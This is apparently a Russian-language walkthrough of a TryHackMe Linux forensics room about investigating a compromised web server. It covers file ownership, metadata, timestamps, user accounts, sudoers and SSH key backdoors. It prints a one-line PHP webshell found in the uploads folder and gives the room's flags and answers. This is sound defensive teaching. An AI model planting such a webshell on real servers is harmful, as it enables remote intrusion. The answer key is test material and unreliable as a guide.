

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Linux File System Analysis](https://tryhackme.com/r/room/linuxfilesystemanalysis) 

Всего 8 заданий:
## Задание 1
### Введение

Выполнение анализа файловой системы в реальном времени часто является ранней частью реагирования на инцидент и имеет 
решающее значение для оценки и определения потенциальных нарушений безопасности. Этот процесс включает в себя 
изучение цифровых артефактов, системных журналов, пользователей и структур файлов для обнаружения доказательств 
несанкционированного доступа, вредоносных действий или компрометации данных.   

Проводя методологические сравнения с операциями судебной экспертизы Windows, судебная экспертиза Linux и 
операционных систем на базе Unix также представляет уникальные проблемы и возможности для судебных аналитиков. 
Поэтому понимание общих артефактов файловых систем Linux, разрешений и механизмов журналов становится жизненно 
важным для своевременного обнаружения и смягчения последствий инцидентов безопасности. Поскольку мы только 
анализируем и идентифицируем артефакты компрометации на этом этапе реагирования на инцидент, важно подчеркнуть, что, 
как правило, небезопасно восстанавливать работающую скомпрометированную систему для дальнейшего использования. 
Вместо этого, безопасное восстановление из резервных копий и выполнение мероприятий по устранению уязвимостей (что 
выходит за рамки этой комнаты) имеет важное значение для восстановления и минимизации воздействия.       

### Цели

Узнайте, как выполнять анализ файловой системы в реальном времени в системе Linux.
Понимание распространенных артефактов, механизмов ведения журналов и действий файловой системы в криминалистике Linux.
Восстановите временную шкалу событий в практическом сценарии реагирования на инцидент.
Предварительные условия

Для проведения криминалистической экспертизы Linux в реальном времени рекомендуется иметь глубокие познания в 
основах операционной системы Linux и концепциях укрепления системы. 

- Основы Linux: Часть 1, Часть 2 и Часть 3
- Усиление защиты системы Linux

### Ответить на вопросы ниже
Я готов продолжить!
```commandline
Ответ не нужен
```

## Задание 2
### Сценарий

Чтобы предложить практический подход к проведению живого расследования, мы получили задание от Penguin Corp провести 
анализ файловой системы и ОС на веб-сервере на базе Linux во время предполагаемого нарушения. Срочность этого 
расследования обусловлена выявлением потенциальной уязвимости загрузки файлов на веб-сервере, создающей путь для 
удаленных злоумышленников для выполнения произвольных команд (удаленное выполнение кода) и получения 
несанкционированного доступа.    

Проанализировав оставшиеся артефакты и восстановив хронологию событий с помощью анализа файловой системы, мы 
намерены предоставить Penguin Corp четкое представление о масштабах и характере взлома.

### Подключение к системе

Сначала нажмите Start Machine, чтобы запустить виртуальную машину, прикрепленную к этой задаче. После развертывания 
машины она запустится в окне с разделенным видом, и вы автоматически подключитесь как пользователь - исследователь. 
Если окно с разделенным видом не появилось автоматически, нажмите кнопку «Show Split View» в верхней части этой 
комнаты.

В качестве альтернативы вы можете получить доступ к нему через SSH, используя AttackBox или ваше VPN-подключение. 
Учетные данные можно найти ниже:

### ТМ-ключ
- Имя пользователя:	investigator
- Пароль:	TryHackMe123!

### Защита окружающей среды

При проведении оперативного судебно-медицинского анализа этой системы важно отметить, что в этом предполагаемом 
сценарии мы уже получили все необходимые резервные копии и изолировали систему от сети, чтобы предотвратить 
дальнейшую компрометацию или несанкционированный доступ.

Поскольку это потенциально скомпрометированный хост, хорошей идеей будет убедиться, что мы используем известные 
хорошие двоичные файлы и библиотеки для сбора и анализа информации. Часто это можно сделать, смонтировав USB или 
диск, содержащий двоичные файлы из чистой установки на основе Debian. Это было смоделировано на подключенной 
виртуальной машине путем копирования папок /bin , /sbin , /lib и /lib64 из чистой установки в монтирование /mnt/usb 
на затронутой системе.    

Примечание: следующие шаги следует выполнять после установления SSH- подключения к целевой машине, а не на AttackBox.

Эти усилия направлены на снижение риска непреднамеренного выполнения вредоносного кода или скомпрометированных 
утилит в системах. Предположим, что злоумышленник получает привилегированный доступ к системе. В этом случае он 
может заменить или изменить существующие утилиты вредоносными двоичными файлами или библиотеками, которые могут 
нанести дополнительный вред при запуске ничего не подозревающим следователем. Использование надежного источника 
повышает надежность и целостность нашего расследования.    

Мы можем изменить наши переменные среды PATH и LD_LIBRARY_PATH переменные среды (общих библиотек), чтобы использовать 
эти доверенные двоичные файлы: 

Изменение переменных среды для включения доверенных путей
```commandline
investigator@MACHINE_IP:~$ export PATH=/mnt/usb/bin:/mnt/usb/sbin
investigator@MACHINE_IP:~$ export LD_LIBRARY_PATH=/mnt/usb/lib:/mnt/usb/lib64
```

### Ответить на вопросы ниже
После обновления PATH переменных LD_LIBRARY_PATH среды и выполните команду check-env. Какой флаг возвращается в выводе?

```commandline
THM{5514ec4f1ce82f63867806d3cd95dbd8}
```

## Задание 3
### Определение точки опоры

Во время нашего первоначального брифинга с Penguin Corp мы узнали, что веб-сервер Penguin Corp подвержен уязвимости 
загрузки файлов, что позволяет злоумышленнику получить root-доступ к системе. Чтобы начать наше расследование, нам 
необходимо иметь возможность эффективно исследовать файлы системы.

Чтобы определить признаки того, что функция загрузки файлов была использована, мы должны сосредоточить наш поиск на 
веб-каталогах и просмотреть загруженные файлы на сервере. Сначала перейдите в веб-каталог /var/www/html/и запустите, 
ls -al чтобы получить список веб-файлов и каталогов: 

Список содержимого /var/www/html
```commandline
investigator@MACHINE_IP:~$ ls -al /var/www/html/
total 32
drwxr-xr-x 4 root     root      4096 Feb 12 23:05 .
drwxr-xr-x 3 root     root      4096 Feb 12 16:25 ..
drwxr-xr-x 2 www-data www-data  4096 Feb 13 00:32 assets
-rw-r--r-- 1 root     root     10918 Feb 12 16:25 index.html
-rwxr-xr-x 1 www-data www-data   905 Feb 12 16:33 upload.php
drwxr-xr-x 2 www-data www-data  4096 Feb 13 00:31 uploads
```

Из структуры каталогов следует, что /uploads каталог будет содержать то, что мы ищем. Давайте перечислим файлы в 
каталоге uploads: 

Список загруженных файлов
```commandline
investigator@MACHINE_IP:~$ ls -al /var/www/html/uploads
total 224
drwxr-xr-x 2 www-data www-data 4096 Feb 13 00:31 .
drwxr-xr-x 4 root     root     4096 Feb 12 23:05 ..
-rw-r--r-- 1 www-data www-data 1908 Feb 12 16:59 ABHz3aj.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12 16:59 AhVpDoS.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12 17:00 AqLnBvC.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12 17:00 AsDfGhJ.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12 17:00 AzSxWqE.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12 17:00 BcFvGtR.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12 17:00 BcNmLoP.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12 16:59 CoSaBmQ.jpeg
...
```

При изучении каталога /uploads становится очевидным, что в нем присутствует множество файлов с, казалось бы, 
случайными именами, включая изображения JPEG. Кроме того, обратите внимание, что все эти файлы принадлежат 
пользователю www-data. Чтобы сосредоточиться на потенциальных файлах, не являющихся изображениями, мы можем 
использовать grep команду для фильтрации файлов JPEG: 

Фильтрация загруженных файлов
```commandline
investigator@MACHINE_IP:~$ ls -al /var/www/html/uploads | grep -v ".jpeg"
total 224
drwxr-xr-x 2 www-data www-data 4096 Feb 13 00:31 .
drwxr-xr-x 4 root     root     4096 Feb 12 23:05 ..
-rw-r--r-- 1 www-data www-data   30 Feb 13 00:31 b2c8e1f5.phtml
```

Опция -vв команде grep отменяет шаблон, отображая файлы, не имеющие расширения ".jpeg". Это позволяет нам 
идентифицировать и расставлять приоритеты для файлов с другими расширениями, такими как PHP, которые могут 
потребовать дальнейшего изучения.  

Просмотр содержимого этого интересного .phtml файла позволяет предположить наличие вредоносного веб-шелла (файла на 
веб-сервере, который позволяет выполнять системные команды), что подтверждает наши предположения: 

Просмотр подозрительной веб-оболочки
```commandline
investigator@MACHINE_IP:~$ cat /var/www/html/uploads/b2c8e1f5.phtml 
<?php system($_GET['cmd']);?>
```

Из вышеприведенного анализа следует, что злоумышленник загрузил .phtmlдокумент для выполнения PHP- кода на сервере. 
Из-за небезопасного system()вызова в PHP- коде этот файл позволяет выполнять произвольные команды в системе удаленно.
Злоумышленник, вероятно, воспользовался этим, чтобы установить более стабильное соединение между веб-сервером и 
своей системой.   

После идентификации загруженного файла, который привел к опоре, теперь хорошей идеей будет просмотреть журналы 
веб-сервера, чтобы сопоставить запрос и получить больше информации об атаке. Журналы веб-сервера, такие как журналы 
Apache или Nginx, могут предоставить ценную информацию о действиях злоумышленника, шаблонах запросов и происхождении.
Этот тип анализа журналов будет рассмотрен в разделе Анализ журналов Linux (скоро) .   

### Право собственности и разрешения

Владение файлами и разрешения являются критически важными аспектами безопасности системы. Как мы определили ранее, 
злоумышленник добился удаленного выполнения кода на сервере, загрузив вредоносную веб-оболочку. Мы также определили, 
что владельцем файла был пользователь www-data , который обычно представляет учетную запись пользователя, связанную 
с процессом веб-сервера. Таким образом, мы должны исследовать дополнительную активность и файлы, принадлежащие 
www-data , чтобы определить, что злоумышленник мог сделать со своим новым доступом.    

Атакующие часто выбирают в качестве цели каталоги с правами записи для загрузки вредоносных файлов. Обычные каталоги 
с правами записи включают: 

/tmp : временный каталог доступен для записи всем пользователям, поэтому его часто выбирают.
/var/tmp : Еще один временный каталог, обычно имеющий всеобщие права на запись.
/dev/shm : файловая система общей памяти, которая обычно доступна для записи всем пользователям.
Хорошей идеей будет запустить ls -al команду для вывода списка файлов в этих каталогах и исследовать любые 
подозрительные файлы или изменения. Мы также можем использовать команду find для быстрого определения файлов, 
соответствующих нашим критериям. Например:  

Список файлов, принадлежащих www-data
```commandline
investigator@MACHINE_IP:~$ find / -user www-data -type f 2>/dev/null | less
/var/www/html/assets/reverse.elf
/var/www/html/uploads/MzCxVeR.jpeg
/var/www/html/uploads/AzSxWqE.jpeg
/var/www/html/uploads/QaWsEdR.jpeg
/var/www/html/uploads/TyHjKlM.jpeg
...
```

Приведенная выше команда возвращает и перечисляет все файлы, которыми владеет пользователь www-data, начиная с 
корневого каталога. Мы также направляем вывод команды в команду less, что позволяет нам прокручивать и разбивать 
вывод на страницы, поскольку записей, скорее всего, будет много. Чтобы выйти из команды less, нажмите Q клавишу.  

В выводе команды мы замечаем несколько безобидных записей. Однако одна, которая выделяется, reverse.elf указана в 
/var/www/html/assets/каталоге. Распечатав файл более подробно (ls -l /var/www/html/assets/reverse.elf), мы можем 
увидеть, что права доступа к файлу указывают на то, что этот файл может быть выполнен всеми пользователями, что 
характеризуется битом x:   

Проверка предполагаемой обратной оболочки
```commandline
investigator@MACHINE_IP:~$ ls -l /var/www/html/assets/reverse.elf 
-rwxr-xr-x 1 www-data www-data 250 Feb 13 00:26 /var/www/html/assets/reverse.elf
```

Прежде чем продолжить исследование reverse.elfфайла, рассмотрим еще несколько полезных findкоманд, которые можно 
использовать для извлечения определенных файлов во время расследования: 

find / -group GROUPNAME 2>/dev/null	Получить список файлов и каталогов, принадлежащих определенной группе.
find / -perm -o+w 2>/dev/null	Получить список всех файлов и каталогов, доступных для записи всем пользователям.
find / -type f -cmin -5 2>/dev/null	Получить список файлов, созданных или измененных за последние пять минут.
Обратите внимание, что каждая команда сопровождается 2>/dev/null очисткой вывода путем подавления любых сообщений об 
ошибках, которые могут возникнуть из-за разрешений. 

### Метаданные

Метаданные относятся к встроенной информации, описывающей файлы, которая дает представление о характеристиках, 
происхождении и атрибутах файла. Они могут включать различные типы информации, такие как даты создания файла, 
сведения об авторе, состав и типы файлов.  

При выполнении анализа системы в реальном времени метаданные могут оказаться весьма полезными для определения 
временных меток происхождения и изменения, а в некоторых случаях и сведений об авторе конкретных файлов. 

Exiftool — это утилита командной строки на основе Perl с широкими возможностями извлечения и изменения метаданных из 
файлов путем анализа их заголовков и встроенных структур метаданных. 

Например, мы можем проанализировать метаданные подозрительного reverse.elf файла, выполнив следующую команду:

Просмотр метаданных reverse.elf
```commandline
investigator@MACHINE_IP:~$ exiftool /var/www/html/assets/reverse.elf 
ExifTool Version Number         : 11.88
File Name                       : reverse.elf
Directory                       : /var/www/html/assets
File Size                       : 250 bytes
File Modification Date/Time     : 2024:02:13 00:26:28+00:00
File Access Date/Time           : 2024:02:13 02:31:29+00:00
File Inode Change Date/Time     : 2024:02:13 00:34:50+00:00
File Permissions                : rwxr-xr-x
File Type                       : ELF executable
File Type Extension             : 
MIME Type                       : ***********/*****-******
CPU Architecture                : 64 bit
CPU Byte Order                  : Little endian
Object File Type                : Executable file
CPU Type                        : AMD x86-64
```

Как видно из приведенного выше вывода, ExifTool сообщает нам более подробную информацию об этом файле, такую как его 
тип, размер, разрешения, архитектура и даже временные метки изменения и доступа. 

### Анализ контрольных сумм

Контрольные суммы — это уникальные значения, сгенерированные из данных с использованием криптографических 
хеш-функций (таких как MD5 или SHA-256 ). Эти функции создают строки символов фиксированного размера, представляющие 
данные, так что даже незначительное изменение данных приведет к существенно иной контрольной сумме.  

Контрольные суммы часто используются для проверки целостности данных, гарантируя, что данные не были изменены или 
повреждены. Для реагирования на инциденты они также могут использоваться для идентификации вредоносных файлов и 
исполняемых файлов на основе известных сигнатур.  

Мы можем использовать две полезные утилиты контрольной суммы для проверки хэшей файла, который reverse.elf мы 
идентифицировали ранее. Мы можем запустить обе md5sumи sha256sum на файле, чтобы вывести его хэш: 

Анализ контрольных сумм файла
```commandline
investigator@MACHINE_IP:~$ md5sum /var/www/html/assets/reverse.elf 
c6cbdba1c147fbb7239284b7df2aa653  /var/www/html/assets/reverse.elf
investigator@MACHINE_IP:~$ sha256sum /var/www/html/assets/reverse.elf 
ee0ea8d8bc205c4e2e2cc9ff7ddb71dee22ac0a50c2042701d49e565e0821410  /var/www/html/assets/reverse.elf
```

Получив значения хэша, мы можем отправить их в службу обнаружения вредоносных программ, например VirusTotal, для 
дальнейшего анализа. Сделав это, мы найдем доказательства того, что различные поставщики помечают этот файл как 
полезную нагрузку Meterpreter reverse shell. Этот быстрый анализ предполагает, что злоумышленник разместил и 
выполнил файл, reverse.elf используя свой начальный RCE для достижения интерактивного подключения reverse shell к 
веб-серверу.    

### Временные метки

Временные метки — это дополнительные фрагменты метаданных, связанные с файлами или событиями, которые указывают, 
когда произошло определенное действие. Временные метки — один из важнейших аспектов отслеживания времени создания, 
изменения и доступа к файлам и каталогам при реагировании на инциденты и судебной экспертизе. Эти временные метки 
бесценны в судебной экспертизе, поскольку они предоставляют важные подсказки о последовательности событий и действий,
выполненных в системе, и помогают установить временную шкалу.    

В системах на базе Unix обычно регистрируются три основные временные метки:

Изменить временную метку (mtime): Эта временная метка отражает последний раз, когда содержимое файла было изменено 
или модифицировано. Всякий раз, когда файл записывается или изменяется, его mtime обновляется. 
Изменить временную метку (ctime): Эта временная метка указывает на последний раз, когда метаданные файла были 
изменены. Метаданные включают такие атрибуты, как разрешения, владение или само имя файла. Всякий раз, когда 
изменяются какие-либо метаданные, связанные с файлом, его ctime обновляется.  
Access Timestamp (atime): Эта временная метка указывает на последний раз, когда файл был доступен или прочитан. 
Всякий раз, когда файл открывается, его atime обновляется. 
Мы можем легко просмотреть временную метку изменения (mtime) файла, выполнив следующую команду:

Просмотр временной метки изменения (mtime)
```commandline
investigator@MACHINE_IP:~$ ls -l /var/www/html/assets/reverse.elf 
-rwxr-xr-x 1 www-data www-data 250 Feb 13 00:26 /var/www/html/assets/reverse.elf
```

Чтобы просмотреть временную метку изменения (ctime) того же файла, мы можем выполнить:

Просмотр временной метки изменения (ctime)
```commandline
investigator@MACHINE_IP:~$ ls -lc /var/www/html/assets/reverse.elf 
-rwxr-xr-x 1 www-data www-data 250 Feb 13 00:34 /var/www/html/assets/reverse.elf
```

Наконец, чтобы просмотреть метку времени доступа (atime) файла, мы можем выполнить:

Просмотр временной метки доступа (atime)
```commandline
investigator@MACHINE_IP:~$ ls -lu /var/www/html/assets/reverse.elf 
-rwxr-xr-x 1 www-data www-data 250 Feb 13 02:31 /var/www/html/assets/reverse.elf
```

Как уже упоминалось, метка времени доступа файла (atime) может быть легко и непреднамеренно обновлена при 
выполнении нами следственных действий. Когда мы просматривали метаданные с помощью ExifTool или анализировали их 
контрольные суммы с помощью md5sum или sha256sum, мы выполняли действия чтения на reverse.elf, тем самым изменяя 
его время доступа. Это важная концепция, которую следует учитывать при криминалистическом анализе в реальном времени,
поэтому крайне важно заранее получить криминалистически надежные резервные копии и копии затронутой системы. Из-за 
этого atime не будет для нас надежной метрикой.     

Хотя полезно вспомнить три команды, указанные выше, мы также можем использовать эту stat команду, чтобы быстро 
увидеть все три временные метки одновременно: 

Просмотр временных меток со статистикой
```commandline
investigator@MACHINE_IP:~$ stat /var/www/html/assets/reverse.elf 
  File: /var/www/html/assets/reverse.elf
  Size: 250       	Blocks: 8          IO Block: 4096   regular file
Device: ca01h/51713d	Inode: 526643      Links: 1
Access: (0755/-rwxr-xr-x)  Uid: (   33/www-data)   Gid: (   33/www-data)
Access: 2024-02-13 02:31:29.256000000 +0000
Modify: 2024-02-13 00:26:28.000000000 +0000
Change: 2024-02-13 00:34:50.679215113 +0000
 Birth: -
```

### Ответить на вопросы ниже
Чтобы попрактиковаться в использовании find команды, найдите все файлы, которые пользователь bob создал за последнюю 
1 минуту. Найдя их, просмотрите их содержимое. Какой флаг вы получите? 

```commandline
THM{0b1313afd2136ca0faafb2daa2b430f3}
```
Извлечь метаданные из reverse.elf файла. Какой у файла тип MIME?

```commandline
application/octet-stream
```
Запустите stat команду для /etc/hosts файла на скомпрометированном веб-сервере. Каково полное значение Modify 
Timestamp (mtime)? 

```commandline
2020-10-26 21:10:44.000000000 +0000
```

## Задание 4
Продолжая наше расследование, мы должны сосредоточиться на пользователях и группах системы. При этом мы можем 
обнаружить доказательства того, что злоумышленник перемещается горизонтально или сохраняет доступ по всей системе, 
эксплуатируя дополнительные уязвимости.  

### Идентификация учетных записей пользователей

В системах типа UNIX каталог /etc/ является центральным местом хранения файлов конфигурации и общесистемных настроек.
В частности, при исследовании учетных записей пользователей /etc/passwdэто разделенный двоеточием текстовый файл, 
содержащий список учетных записей системы и их атрибутов, таких как идентификатор пользователя ( UID ), 
идентификатор группы (GID), местоположение домашнего каталога и оболочка входа, определенная для пользователя.

Давайте просмотрим учетные записи пользователей в затронутой системе, прочитав файл:

Просмотр содержимого /etc/passwd
```commandline
investigator@MACHINE_IP:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
```

Злоумышленники могут сохранить доступ к системе, создав пользователя-бэкдора с правами root. Мы можем использовать 
команды cutи grepдля быстрого определения этого типа бэкдора учетной записи пользователя. Следующая команда 
извлекает и отображает все учетные записи пользователей с идентификатором пользователя ( UID ) 0. Наличие 
пользователя с UID 0, отличного от законной учетной записи пользователя root, может быстро указать на потенциальную 
учетную запись бэкдора.    

Фильтрация содержимого /etc/passwd
```commandline
investigator@MACHINE_IP:~$ cat /etc/passwd | cut -d: -f1,3 | grep ':0$'
root:0
**********:0
```

В приведенной выше команде мы сначала отображаем содержимое файла /etc/passwd. Затем мы берем содержимое и выполняем 
cut действие по извлечению только первого (имя пользователя) и третьего (идентификатор пользователя) полей из каждой 
строки, разделенных ( -d символом :. Затем мы используем grep команду для извлечения определенных записей, содержащих 
:0, что означает идентификатор пользователя 0.   

Однако это не является надежным методом, поскольку бэкдор-аккаунт мог быть создан с использованием законных 
идентификаторов пользователя и группы. Для дальнейшего расследования мы можем взглянуть на группы.

### Идентификация групп

В системах Linux определенные группы предоставляют определенные привилегии, которые могут быть целью злоумышленников 
для повышения их привилегий. Некоторые важные группы Linux , которые могут представлять интерес для злоумышленника, 
включают:  

sudo или wheel : члены группы sudo (или wheel) имеют право выполнять команды с повышенными привилегиями с помощью sudo.
adm : Группа adm обычно имеет доступ на чтение файлов системного журнала.
shadow : Группа shadow связана с управлением аутентификацией пользователя и информацией о пароле. С этим членством пользователь может читать файл /etc/shadow, содержащий хэши паролей всех пользователей в системе.
диск : члены группы дисков имеют практически неограниченный доступ на чтение и ограниченный доступ на запись внутри системы.
Мы можем просмотреть все группы (и их соответствующие идентификаторы групп) в системе, прочитав файл /etc/group:

Просмотр содержимого /etc/group
```commandline
investigator@MACHINE_IP:~$ cat /etc/group
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog,ubuntu,investigator
...
```

Чтобы определить, в какие группы входит конкретный пользователь, мы можем выполнить следующую команду:

Просмотр определенных групп пользователей
```commandline
investigator@MACHINE_IP:~$ groups investigator
investigator : investigator adm dialout cdrom floppy sudo audio dip video plugdev netdev lxd
```

В качестве альтернативы, чтобы вывести список всех членов определенной группы, мы можем выполнить следующую команду:

Просмотр пользователей определенных групп
```commandline
investigator@MACHINE_IP:~$ getent group adm
adm:x:4:syslog,ubuntu,investigator
```

Если в группе несколько пользователей (как показано выше), их имена пользователей будут перечислены в записи через 
запятую. 

Чтобы вывести список всех пользователей в группе sudo , мы можем указать либо имя «sudo», либо идентификатор группы, 
обычно 27. 

Просмотр участников группы по идентификатору группы
```commandline
investigator@MACHINE_IP:~$ getent group 27
sudo:x:27:ubuntu,investigator
```

### Логины и активность пользователей

Проверка входов и активности пользователей имеет ценность для проведения анализа скомпрометированной системы в 
реальном времени. К счастью, несколько полезных утилит и журналов могут нам помочь.

последний и последнийб

Команда last является прекрасным инструментом для проверки входов и сеансов пользователей. Она используется для 
отображения истории последних вошедших в систему пользователей. Она работает, считывая файл /var/log/wtmp, который 
представляет собой файл, содержащий все действия по входу и выходу из системы. Аналогично, lastbв частности, 
отслеживает неудачные попытки входа, считывая содержимое /var/log/btmp, что может помочь идентифицировать атаки на 
вход и пароль.   

последний пример
```commandline
investigator@MACHINE_IP:~$ last
investig pts/1        10.10.152.206    Tue Feb 13 02:37   still logged in
investig pts/0        10.10.101.34     Tue Feb 13 02:29   still logged in
reboot   system boot  5.4.0-1029-aws   Tue Feb 13 02:28   still running
investig pts/1        10.10.101.34     Tue Feb 13 02:23 - crash  (00:05)
investig pts/0        10.10.101.34     Tue Feb 13 02:16 - 02:22  (00:05)
reboot   system boot  5.4.0-1029-aws   Tue Feb 13 02:14   still running
...
```

последний журнал

В отличие от last команды, которая предоставляет информацию обо всех входах пользователя в систему, данная 
lastlog команда фокусируется на последней активности пользователя при входе в систему и считывает данные из 
/var/log/lastlog файла.

Пример lastlog
```commandline
investigator@MACHINE_IP:~$ lastlog
Username         Port     From             Latest
root                                       **Never logged in**
daemon                                     **Never logged in**
bin                                        **Never logged in**
sys                                        **Never logged in**
sync                                       **Never logged in**
...
```

### Неудачные попытки входа

В дополнение к lastb, есть и другие способы просмотра неудачных попыток входа в Linux через специальные файлы 
журнала. Файл /var/log/auth.log(или /var/log/secure в некоторых дистрибутивах, таких как CentOS или Red Hat) содержит 
записи событий, связанных с аутентификацией, включая как успешные, так и неудачные попытки входа.

### Who

Команда who является очень простой командой, которая может использоваться для отображения пользователей, которые в 
данный момент вошли в систему. Вывод этой команды может содержать такие сведения, как имя вошедшего в систему 
пользователя, используемое терминальное устройство, время установления сеанса, активность в режиме ожидания, 
идентификатор процесса оболочки и дополнительные комментарии, которые могут включать такие сведения, как начальная 
команда, использованная для запуска сеанса.

кто Пример
```commandline
investigator@MACHINE_IP:~$ who
investigator pts/0        2024-02-13 02:29 (10.10.101.34)
```

### Судо

Файл /etc/sudoers является особенно чувствительным файлом конфигурации в системах типа Unix. Он определяет, какие 
пользователи обладают привилегиями sudo, что позволяет им выполнять команды как другие пользователи, обычно 
пользователь root. 

В результате он может стать целью для злоумышленников, стремящихся к настойчивости. Например, если злоумышленник 
найдет способ вставить свою учетную запись пользователя (или ту, которую он контролирует) в файл sudoers, он может 
предоставить себе повышенные привилегии без необходимости аутентификации. В качестве альтернативы они могут изменить 
существующие записи, чтобы расширить свой доступ.   

Например, строка в файле sudoers может выглядеть так:
```commandline
/etc/sudoers Пример
user@tryhackme$ sudo cat /etc/sudoers
richard   ALL=(ALL) /sbin/ifconfig
```

Более конкретно, эта строка определяет:

richard — имя пользователя, которому предоставлены привилегии sudo.
ALL указывает, что привилегия распространяется на все хосты.
(ALL) указывает, что пользователь может выполнить команду как любой другой пользователь.
/sbin/ifconfig— это путь к конкретному исполняемому файлу, в данном случае — утилите ifconfig.
При такой конфигурации Ричард может выполнять ifconfig команды с повышенными привилегиями sudo для управления 
сетевыми интерфейсами по мере необходимости.

### Ответить на вопросы ниже
Исследуйте учетные записи пользователей в системе. Каково имя учетной записи бэкдора, которую создал злоумышленник?

```commandline
b4ckd00r3d
```
Как называется группа с идентификатором 46 ?


```commandline
plugdev
```
Просмотреть /etc/sudoersфайл на скомпрометированной системе. Каков полный путь к двоичному файлу, который Джейн 
может запустить как sudo? 

```commandline
/usr/bin/pstree
```

## Задание 5
В предыдущей задаче мы определили учетную запись бэкдора, которую создал и к которой получил доступ злоумышленник. 
Однако нам следует сделать шаг назад и определить, как злоумышленник изначально получил привилегии для создания этой 
учетной записи. Чтобы расширить наше расследование в отношении пользователей и групп системы, нам также следует 
изучить личный каталог, файлы, историю и конфигурации каждого пользователя.

### Домашние каталоги пользователей

Домашние каталоги пользователей в Linux содержат персонализированные настройки, конфигурации и данные, специфичные 
для пользователя. Эти каталоги обычно располагаются под каталогом /homeи называются по соответствующим именам 
пользователей в системе. Вспомните просмотр /etc/passwdфайла и идентификацию различных пользователей и их домашних 
каталогов.   

Мы можем вывести список домашних каталогов с помощью простой ls -lкоманды:

Список каталогов /home
```commandline
investigator@MACHINE_IP:~$ ls -l /home
total 16
drwxr-xr-x 4 bob          bob          4096 Feb 12 19:32 bob
drwxr-xr-x 3 investigator investigator 4096 Feb 13 02:22 investigator
drwxr-xr-x 4 jane         jane         4096 Feb 13 00:36 jane
drwxr-xr-x 5 ubuntu       ubuntu       4096 Feb 12 21:23 ubuntu
```

### Скрытые файлы

Скрытые файлы, идентифицируемые точкой в начале имени файла, часто хранят конфиденциальные конфигурации и информацию 
в домашнем каталоге пользователя. По умолчанию мы не можем вывести список этих скрытых файлов с помощью ls. Чтобы 
просмотреть их, нам нужно указать аргумент -a, который будет включать все записи, начинающиеся с точки.  

Чтобы вывести список скрытых файлов в домашнем каталоге Джейн, выполните:

Список скрытых файлов и каталогов Джейн
```commandline
investigator@MACHINE_IP:~$ ls -a /home/jane
.  ..  .bash_history  .bash_logout  .bashrc  .cache  .profile  .ssh
```

Вот некоторые распространенные файлы, которые могут представлять интерес в ходе расследования:

.bash_history : Этот файл содержит историю команд пользователя и может использоваться для отображения предыдущих 
команд, выполненных пользователем. 
.bashrc и .profile : это файлы конфигурации, используемые для настройки сеансов оболочки Bash и среды входа 
пользователя соответственно. 
Кроме того, мы можем просмотреть другие интересующие нас файлы и каталоги, такие как профили браузера и .ssh каталог.

### SSH и бэкдоры

Каталог .sshявляется уязвимой областью, содержащей файлы конфигурации и ключей, связанные с соединениями SSH . 
authorized_keys Файл в каталоге является критическим, поскольку он содержит список открытых ключей, разрешенных для 
подключения к учетной записи пользователя через SSH.  

Если злоумышленник получит несанкционированный доступ к системе и захочет постоянно получать доступ к учетной записи 
другого пользователя (например, учетной записи Джейн), добавив свой открытый ключ в файл authorized_keys, мы 
потенциально можем обнаружить артефакты, указывающие на эти действия.  

Сначала перейдите в .sshкаталог в домашней папке Джейн. Отсюда мы можем запустить , ls -alчтобы получить список 
содержащихся файлов: 

Листинг каталога .ssh Джейн
```commandline
investigator@MACHINE_IP:~$ ls -al /home/jane/.ssh
total 20
drwxr-xr-x 2 jane jane 4096 Feb 12 17:15 .
drwxr-xr-x 4 jane jane 4096 Feb 13 00:36 ..
-rw-rw-rw- 1 jane jane 1136 Feb 13 00:34 authorized_keys
-rw------- 1 jane jane 3389 Feb 12 17:12 id_rsa
-rw-r--r-- 1 jane jane  746 Feb 12 17:12 id_rsa.pub
```

Давайте просмотрим файл, чтобы посмотреть, сможем ли мы обнаружить какие-либо непреднамеренные авторизованные 
открытые ключи: 

Просмотр записей author_keys Джейн
```commandline
investigator@MACHINE_IP:~$ cat /home/jane/.ssh/authorized_keys 
ssh-rsa ******************** jane@ip-10-10-25-169
ssh-rsa ******************** backdoor
```

Обратите внимание, что есть две записи. Первая принадлежит Джейн, на что указывает завершающий комментарий. Однако 
вторая запись, похоже, связана с совершенно другой парой ключей с комментарием «backdoor». Злоумышленник, вероятно, 
смог отредактировать этот файл и добавить свой собственный открытый ключ, что позволило ему получить доступ по SSH 
как Джейн.   

Мы можем подтвердить это еще раз, вернувшись к statкоманде. Запустив ее в файле, мы увидим, что последний раз он был 
изменен примерно в тот же временной промежуток, когда мы подтвердили, что злоумышленник получил первоначальный 
плацдарм в системе.  

Просмотр временных меток в файле authorized_keys
```commandline
investigator@MACHINE_IP:~$ stat /home/jane/.ssh/authorized_keys 
  File: /home/jane/.ssh/authorized_keys
  Size: 1136      	Blocks: 8          IO Block: 4096   regular file
Device: ca01h/51713d	Inode: 257561      Links: 1
Access: (0666/-rw-rw-rw-)  Uid: ( 1002/    jane)   Gid: ( 1002/    jane)
Access: 2024-02-13 00:34:53.692530853 +0000
Modify: ****-**-** **:**:**.********* +****
Change: 2024-02-13 00:34:16.005897449 +0000
 Birth: -
```

Если мы вернемся к выводу команды ls -al, то сможем определить неправильную конфигурацию разрешений, которая сделала 
это возможным: 

Просмотр разрешений файла authorized_keys
```commandline
investigator@MACHINE_IP:~$ ls -al /home/jane/.ssh/authorized_keys 
-rw-rw-rw- 1 jane jane 1136 Feb 13 00:34 /home/jane/.ssh/authorized_keys
```

Как идентифицировано третьими rw разрешениями, этот файл доступен для записи всем, что никогда не должно быть в 
случае с конфиденциальными файлами. Следовательно, эксплуатируя эту неправильную конфигурацию, злоумышленник получил 
несанкционированный доступ SSH к системе, как будто он был Джейн. 

### Ответить на вопросы ниже
Просмотреть файл Джейн .bash_history. Какой флаг вы видите в выводе?

```commandline
THM{f38279ab9c6af1215815e5f7bbad891b}
```
